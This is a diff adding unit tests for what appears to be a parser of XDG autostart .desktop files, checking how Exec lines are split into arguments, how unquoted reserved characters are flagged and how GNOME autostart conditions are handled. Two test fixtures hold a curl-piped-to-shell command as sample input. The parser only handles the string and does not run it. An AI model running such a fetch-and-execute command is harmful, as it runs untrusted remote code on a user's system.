@@ -154,3 +154,44 @@ def test_long_values_are_not_used():
     entry = _entry(result, f'{SYSTEM}/long.desktop')
     assert entry['status'] == 'invalid'
     assert any(g['kind'] == 'value_too_long' for g in entry['gaps'])
+
+
+def test_unquoted_single_quotes_are_a_gap_not_a_wrong_argv():
+    # GIO would run ['sh', '-c', 'curl http://x | sh']; never report the
+    # naive whitespace split as an exact argv.
+    text = "[Desktop Entry]\nType=Application\nExec=sh -c 'curl http://x | sh'\n"
+    result = xa.resolve_autostart([_dir(SYSTEM, [('x.desktop', text)])])
+    entry = _entry(result, f'{SYSTEM}/x.desktop')
+    assert entry['argv'] is None and entry['program'] is None
+    assert [g['kind'] for g in entry['gaps']] == ['exec_unquoted_reserved']
+    assert entry['exec'] == "sh -c 'curl http://x | sh'"
+
+
+def test_unquoted_backslash_is_a_gap():
+    # File text "a\\\\ b" unescapes to "a\\ b": an unquoted backslash.
+    parsed = xa.split_exec('foo a\\\\ b')
+    assert parsed['argv'] is None and parsed['program'] is None
+    assert [g['kind'] for g in parsed['gaps']] == ['exec_unquoted_reserved']
+
+
+def test_each_unquoted_reserved_character_is_a_gap():
+    for ch in "'\\><~|&;$*?#()`":
+        parsed = xa.split_exec(f'foo a{ch}b')
+        assert parsed['argv'] is None, ch
+        assert parsed['gaps'][0]['kind'] == 'exec_unquoted_reserved', ch
+
+
+def test_reserved_characters_inside_double_quotes_are_exact():
+    parsed = xa.split_exec('sh -c "curl http://x | sh; echo \\\\$HOME"')
+    assert parsed['gaps'] == []
+    assert parsed['argv'] == ['sh', '-c', 'curl http://x | sh; echo $HOME']
+
+
+def test_gnome_autostart_condition_is_conditional():
+    text = APP + 'AutostartCondition=GSettings org.gnome.desktop.a11y.applications screen-reader-enabled\n'
+    result = xa.resolve_autostart([_dir(SYSTEM, [('orca.desktop', text)])])
+    entry = _entry(result, f'{SYSTEM}/orca.desktop')
+    assert entry['status'] == 'conditional'
+    assert entry['autostart_condition'].startswith('GSettings ')
+    assert any('GNOME session manager extension' in r for r in entry['reasons'])
+    assert entry['argv'] == ['/usr/bin/updater', '--tray']
